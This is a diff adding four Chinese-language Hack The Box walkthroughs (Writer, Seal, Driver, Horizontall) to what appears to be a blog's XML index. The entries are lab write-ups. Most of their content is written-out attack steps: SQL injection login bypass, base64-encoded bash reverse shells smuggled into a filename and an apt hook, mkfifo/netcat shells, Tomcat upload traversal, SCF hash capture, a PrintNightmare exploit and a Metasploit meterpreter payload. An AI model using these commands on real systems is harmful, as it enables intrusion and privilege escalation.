@@ -4,6 +4,94 @@
   
   
   <entry>
+    <title>Write</title>
+    <link href="/2021/10/18/Write/"/>
+    <url>/2021/10/18/Write/</url>
+    
+    <content type="html"><![CDATA[<hr><pre><code>nmap -A -sS -sV 10.10.11.101 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) |   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Story Bank | Writer.HTB 139/tcp open  netbios-ssn Samba smbd 4.6.2 445/tcp open  netbios-ssn Samba smbd 4.6.2</code></pre><p><img src="https://pic.imgdb.cn/item/616d35282ab3f51d91bc8801.jpg"></p><p>扫描器干他</p><hr><pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/</code></pre><hr><pre><code>http://10.10.11.101/static/   一个目录遍历 http://10.10.11.101/administrative   一个后台，好像也不是cms ，这种条条框框的用弱口令和注入测一下</code></pre><p>登录哪里抓包，跑到一个注入，登录框的注入，一般应该还有万能密码登录</p><hr><pre><code>跑个万能密码的字典应该也能进 admin &#39; or &#39;1&#39;=&#39;1 admin &#39; or &#39;1&#39;=&#39;1 登录成功</code></pre><p><img src="https://pic.imgdb.cn/item/616d352c2ab3f51d91bc8a96.jpg"></p><p>sqlmap说有6个字段， test’ union select 1,2,3,4,5,6;–+爆显示位<br><img src="https://pic.imgdb.cn/item/616d35312ab3f51d91bc8d3c.jpg"></p><p>读取/etc/passwd文件<br><img src="https://pic.imgdb.cn/item/616d35332ab3f51d91bc8ef8.jpg"></p><p>进入后台翻一下，发现有上传文件的功能，但是只能上传图片，</p><hr><pre><code>用kali做一个图片马  echo -n &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/1234 0&gt;&amp;1&quot;&#39; | base64 得到一个base64 L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==  touch &#39;1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;&#39;  file:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;#</code></pre><p><img src="https://pic.imgdb.cn/item/616d35392ab3f51d91bc9273.jpg"></p><p>在home下ls发现两个账户 john kyle</p><hr><pre><code>九头蛇跑密码 hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh</code></pre><hr><pre><code>进数据库拿kyle的hash,先拿数据库的账号和密码 cd /etc/mysql cat mariadb.cnf  拿到密码登录mysql user = djangouser password = DjangoSuperPassword</code></pre><p><img src="https://pic.imgdb.cn/item/616d353d2ab3f51d91bc9679.jpg"></p><hr><pre><code>mysql -u djangouser -h 127.0.0.1 -p DjangoSuperPassword     show databases; use dev; show tables; SELECT * FROM auth_user; 拿到hash值去hashcat或john爆破忘了截图了。。</code></pre><hr><pre><code>kyle marcoantonio ssh kyle@10.10.11.101</code></pre><p><img src="https://pic.imgdb.cn/item/616d35412ab3f51d91bc9a6c.jpg"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr><pre><code>准备两个脚本python -m SimpleHTTPServer 80 传上去</code></pre><hr><pre><code>#!/bin/bash# Localize these.bash -i &amp;&gt;/dev/tcp/10.10.14.14/4444 0&gt;&amp;1INSPECT_DIR=/var/spool/filterSENDMAIL=/usr/sbin/sendmail# Get disclaimer addressesDISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses# Exit codes from &lt;sysexits.h&gt;EX_TEMPFAIL=75EX_UNAVAILABLE=69# Clean up when done or when aborting.trap &quot;rm -f in.$$&quot; 0 1 2 3 15# Start processing.cd $INSPECT_DIR || &#123; echo $INSPECT_DIR does not exist; exit$EX_TEMPFAIL; &#125;cat &gt;in.$$ || &#123; echo Cannot save mail to file; exit $EX_TEMPFAIL; &#125;# obtain From addressfrom_address=`grep -m 1 &quot;From:&quot; in.$$ | cut -d &quot;&lt;&quot; -f 2 | cut -d &quot;&gt;&quot; -f 1`if [ `grep -wi ^$&#123;from_address&#125;$ $&#123;DISCLAIMER_ADDRESSES&#125;` ]; then  /usr/bin/altermime --input=in.$$ \                   --disclaimer=/etc/postfix/disclaimer.txt \                   --disclaimer-html=/etc/postfix/disclaimer.txt \                   --xheader=&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot; || \                    &#123; echo Message content rejected; exit $EX_UNAVAILABLE; &#125;fi$SENDMAIL &quot;$@&quot; &lt;in.$$exit $?</code></pre><p>这是修改原文件/etc/postfix/disclaimer后得到的脚本，这里只是举个例子，该靶机无法使用bash和sh进行反弹 shell。可以使用python或socat进行getshell，由于懒，我就不修改了 查看文件/etc/postfix/disclaimer_addresses得到邮箱<a href="mailto:&#x6b;&#x79;&#x6c;&#101;&#x40;&#119;&#x72;&#x69;&#x74;&#101;&#114;&#x2e;&#x68;&#x74;&#98;">&#x6b;&#x79;&#x6c;&#101;&#x40;&#119;&#x72;&#x69;&#x74;&#101;&#114;&#x2e;&#x68;&#x74;&#98;</a> 使用该邮箱编写脚本</p><hr><pre><code>import smtplibhost = &#39;127.0.0.1&#39;port = 25sender_email = &quot;kyle@writer.htb&quot;receiver_email = &quot;kyle@writer.htb&quot;message = &quot;&quot;&quot;\Subject: Hi thereTest_python_sender.&quot;&quot;&quot;try:    server = smtplib.SMTP(host, port)    server.ehlo()    server.sendmail(sender_email, receiver_email, message)except Exception as e:    print(e)finally:    server.quit()</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d354c2ab3f51d91bca4bb.jpg"></h2><pre><code>访问/home/john/.ssh文件拿到id_rsa kali本地创建id_rsa复制内容 chmod 600 id_rsa   ssh -i id_rsa john@10.10.11.101</code></pre><hr><pre><code>提权参考：https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</code></pre><p><img src="https://pic.imgdb.cn/item/616d39622ab3f51d91bfd97f.jpg"></p><hr><pre><code>cd /etc/apt/apt.conf.d  echo &#39;apt::Update::Pre-Invoke &#123;&quot;echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTAwODYgMD4mMSI= | base64 -d | bash&quot;&#125;;&#39;&gt; pwn base64：/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/10086 0&gt;&amp;1&quot; nc -nvlp 10086  多等会儿，root权限就来了最后一个在root下 cat root.txt就行了</code></pre><p><img src="https://pic.imgdb.cn/item/616d396b2ab3f51d91bfe01a.jpg"></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Seal</title>
+    <link href="/2021/10/18/Seal/"/>
+    <url>/2021/10/18/Seal/</url>
+    
+    <content type="html"><![CDATA[<p>中等难度，且评分4.8很棒的靶场</p><hr><pre><code>nmap -sS -T5 10.10.10.250  PORT     STATE SERVICE 22/tcp   open  ssh 443/tcp  open  https 8080/tcp open  http-proxy</code></pre><hr><pre><code>访问一个8080端口，提示注册用户，注册一个常试登录一下 hacker hacker</code></pre><p><img src="https://pic.imgdb.cn/item/616d2fae2ab3f51d91b86a4d.jpg"><br><img src="https://pic.imgdb.cn/item/616d2fb12ab3f51d91b86d66.jpg"><br><img src="https://pic.imgdb.cn/item/616d2fb42ab3f51d91b86f6c.jpg"></p><p>updating tomcat configuration  点了之后给了tomcat的帐密</p><hr><pre><code>&lt;user username=&quot;tomcat&quot; password=&quot;42MrHBf*z8&#123;Z%&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;</code></pre><p>访问tomcat默认登录目录，用刚才的账号密码登录，登录成功<br><img src="https://pic.imgdb.cn/item/616d2fb82ab3f51d91b8733d.jpg"></p><hr><pre><code>https://seal.htb/manager/status/..;/html   上面有个上传</code></pre><p>需要在上传的路径上修改 </p><hr><pre><code>POST /manager/satus/..;/html/upload?</code></pre><p>200上传成功，访问木马</p><hr><pre><code>seal.htb/ma/ nc -nvlp 4444 反弹成功</code></pre><hr><pre><code>cd home/luis  发现user.txt访问不了，需要提权。   .ssh也没有访问权限</code></pre><p>尝试创建一个指向luis的id_rsa的链接，我们可以把它放到/uploads目录中  </p><hr><pre><code>cd /opt/backups/archives  ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa  cp 新出现的backup+日期的文件 /dev/shm  cd /dev/shm  mv backup-2021-07-26-14:20:32.gz backup.tar.gz  tar -xvf backup.tar.gz  cd /dashboard/uploads  cat id_rsa  kali 本机创建一个 luis-id_rsa文件复制id_rsa里面的内容 ssh -i lis-id_rsa luis@10.10.10.250 连接成功，找到第一个user.txt</code></pre><hr><pre><code>sudo -l /usr/bin/ansible-playbook </code></pre><hr><pre><code>google找到这个玩意儿，应该是用来编写网页的是一个东西吧，但是可以用来执行命令， https://docs.ansible.com/ansible/latest/user_guide/playbooks.html</code></pre><p>创建一个yml文件</p><hr><pre><code>创建一个yml文件- name: Ansible Copy Example Local to Remote  hosts: localhost  tasks:    - name: copying file with playbook      become: true       copy:        src: /root/root.txt        dest: /dev/shm        owner: luis        group: luis                mode: 0777</code></pre><hr><pre><code>sudo -u root /usr/bin/ansible-playbook root.yml </code></pre><p>访问/dev/shm/root.txt就成功了。<br><img src="https://pic.imgdb.cn/item/616d2fc22ab3f51d91b87a81.jpg"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Hack The Box</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Hack The Box</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Driver</title>
+    <link href="/2021/10/18/Driver/"/>
+    <url>/2021/10/18/Driver/</url>
+    
+    <content type="html"><![CDATA[<hr><pre><code>http://10.10.11.106</code></pre><p>打开会有一个登陆框(打印机)，随便输入登录名和密码，成功登入</p><p>随便点的时候发现一个上传的地方</p><p>端口情况<br><img src="https://pic.imgdb.cn/item/616d2d402ab3f51d91b634aa.jpg"></p><p>用Responder上传scf文件尝试抓取hash</p><hr><pre><code>python Responder.py -I tun0</code></pre><p>创建一个1.scf文件，上传上去</p><hr><pre><code>[Shell] Command=2 IconFile=\\10.10.14.23\share\test.ico [Taskbar] Command=ToggleDesktop</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d2d442ab3f51d91b637ed.jpg"></h2><pre><code>scr文件攻击相关文章 https://www.t00ls.cc/articles-42590.html?page=4 https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458286248&amp;idx=1&amp;sn=4cdbf73f47753a979024958622b468e7&amp;chksm=b181482286f6c1348bfb6be7e52716381befddb979c5e7b94335c71f9532e9691e979833df78&amp;scene=38#wechat_redirect</code></pre><p><img src="https://pic.imgdb.cn/item/616d2d472ab3f51d91b63ae0.jpg"></p><p>用hashcat跑，这里要注意hash的类型，NetNTLMv2 Hash   -m 指定 模式 5600</p><hr><pre><code>hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 5600</code></pre><p><img src="https://pic.imgdb.cn/item/616d2d4a2ab3f51d91b63e3c.jpg"></p><p>获得密码liltony<br>用evil-winrm登录</p><hr><pre><code>evil-wirm -i 10.10.11.106 -u tony -p liltony</code></pre><p>在Desktop下拿到第一个flag<br>提权<br>winpeas 这个文件跑出来也看不懂啥子，，，多看文章看他们怎么用的<br>先用ew上传 </p><hr><pre><code>upload /root/tools/winPEAS.bat</code></pre><p>发现一个spoolsv </p><hr><pre><code>下载exp https://github.com/calebstewart/CVE-2021-1675</code></pre><p>upload 上传上去，然后加载（这里有个坑，powershell默认不允许运行脚本，可以用命令打开）</p><hr><pre><code>Import-Module .\cve-2021-1675.ps1  Invoke-Nightmare  -NewUser &quot;hacker&quot; -NewPassword &quot;hacker&quot;</code></pre><p>第一步：以管理员身份运行powershell 第二步：执行：get-ExecutionPolicy，回复Restricted，表示状态是禁止的。 第三步：执行：set-ExecutionPolicy RemoteSigned 第四步：选择Y，回车。 第五步：重启powershell，问题解决。</p><p>但是在evil-winrm里面并不得行，启动不了那个模式，尝试用msf，web投递上线，然后搞</p><hr><pre><code>use exploit/multi/script/web_delivery set target 2 set payload windows/x64/meterpreter/reverse_tcp set lhost 10.10.14.7 set lport 5555 exploit</code></pre><p>上线成功，加载exp模块<br>    load powershell<br>    powershell_shell<br>    Import-Module .\CVE-2021-1675.ps1</p><p><img src="https://pic.imgdb.cn/item/616d2d4e2ab3f51d91b64321.jpg"></p><p>再用evil-WinRM登录就行了， 再administrator/desktop里面找到root.txt</p><p><img src="https://pic.imgdb.cn/item/616d2d512ab3f51d91b645b6.jpg"></p><p>终于打完了，遇到的问题就是提权，spoolsv记住这个玩意儿可以提权，然后evil-winrm允许运行脚本哪里 哪里如果整不上不是还可以用msf吗，这个思路要有，<br><img src="https://pic.imgdb.cn/item/616d2d542ab3f51d91b6486f.jpg"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Hack The Box</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Hack The Box</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Horizontall</title>
+    <link href="/2021/10/18/Horizontall/"/>
+    <url>/2021/10/18/Horizontall/</url>
+    
+    <content type="html"><![CDATA[<hr><pre><code>nmap -sS -sC -sV -A -p- 10.10.11.105</code></pre><p>一样的22 和 80 靶场绑定了域名修改etc/hosts文件 </p><hr><pre><code>echo 10.10.11.105 horizontall.htb &gt;&gt; /etc/hosts</code></pre><p>gobuster啥都没跑出来 这种情况，网站没有啥功能点，但是扫目录也没有可以利用的东西，尝试从接口入手</p><hr><pre><code>jsfinder python3 JSFinder.py -u http://horizontall.htb/</code></pre><p><img src="https://pic.imgdb.cn/item/616d26652ab3f51d91b02160.jpg"><br>同样的接口也写在hosts文件里</p><hr><pre><code>echo 10.10.11.105 api-prod.horizontall.htb &gt;&gt; /etc/hosts</code></pre><p>扫接口看有没有东西<br><img src="https://pic.imgdb.cn/item/616d26692ab3f51d91b024b8.jpg"></p><p>扫到一个后台，并且是一个cms，然后找下有没有公开的漏洞 </p><hr><pre><code>http://api-prod.horizontall.htb/admin/auth/login</code></pre><p>访问目录/admin/strapiVersion可获取strapi的版本号<br><img src="https://pic.imgdb.cn/item/616d266e2ab3f51d91b02b91.jpg"><br><img src="https://pic.imgdb.cn/item/616d26722ab3f51d91b02f1f.jpg"></p><p>exp-db找到一个exp<br><img src="https://pic.imgdb.cn/item/616d26752ab3f51d91b03217.jpg"></p><p>可以重置密码和rce</p><hr><pre><code>nc 10.10.14.7 1234  nc -lvvp 1234  弹是弹了，但是执行不了命令</code></pre><hr><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 1234 &gt;/tmp/f</code></pre><p><img src="https://pic.imgdb.cn/item/616d26782ab3f51d91b034c0.jpg"></p><p>nc -lvvp 1234 弹回来了，能执行了 </p><hr><pre><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; </code></pre><p>在home文件夹下的下一个文件夹找到user.txt<br><img src="https://pic.imgdb.cn/item/616d267c2ab3f51d91b03868.jpg"></p><p>上传了一个提权工具linpeas.sh 这个脚本非常厉害，可以枚举linux操作系统几乎所有的可提权项，甚至可以通过su暴力破解本地密码，输出非常多。  第一次用这个工具，好像确实屌，找到一个8000的端口和一个1337端口<br><img src="https://pic.imgdb.cn/item/616d26802ab3f51d91b03c71.jpg"></p><p>这个尝试连ssh 但是连不上<br><img src="https://pic.imgdb.cn/item/616d26832ab3f51d91b03e5d.jpg"></p><hr><pre><code>de1veloper #J!:F9Zt2u</code></pre><p>传个frp访问一下他的8000端口 传了依旧访问不了，明天打，</p><p>ssh-keygen生成一个公钥，传上去，然后连接</p><hr><pre><code>wget 10.10.14.7/id_rsa.pub -O authorized_keysssh strapi@10.10.11.105 -i id_rsa</code></pre><p>ssh 把8000端口转发出来</p><hr><pre><code>ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105</code></pre><p>数据库连接进去看一下 有一个strapi表<br><img src="https://pic.imgdb.cn/item/616d26862ab3f51d91b041b4.jpg"></p><p>进去看下<br><img src="https://pic.imgdb.cn/item/616d26892ab3f51d91b0456d.jpg"></p><hr><pre><code>select * from strapi_administrator; |  3 | admin    | admin@horizontall.htb | $2a$10$7NGi1GoBaGP3Lw3FYAjw9OhXkgqVRpoecHoaXXIwoVhLZx0etorve | NULL               |    NULL |</code></pre><p>kali 写个公钥进去 把端口带到本地的8000</p><hr><pre><code>ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb</code></pre><p>127.0.0.1:8000访问不了，不打了，下一位。</p><p>他妈的，访问不了的原因是开了梯子，，，，淦<br><img src="https://pic.imgdb.cn/item/616d268d2ab3f51d91b04999.jpg"></p><p>红日7也出现过这玩意儿，直接用exp rce打就行了</p><hr><pre><code>python3 exploit.py http://localhost:8000 Monolog/RCE1 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 2345 &gt;/tmp/f &quot;</code></pre><hr><pre><code>nc -lvvp 2345</code></pre><p>弹回来了<br><img src="https://pic.imgdb.cn/item/616d26902ab3f51d91b04d1a.jpg"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Hack The Box</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Hack The Box</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Previse</title>
     <link href="/2021/10/18/Previse/"/>
     <url>/2021/10/18/Previse/</url>
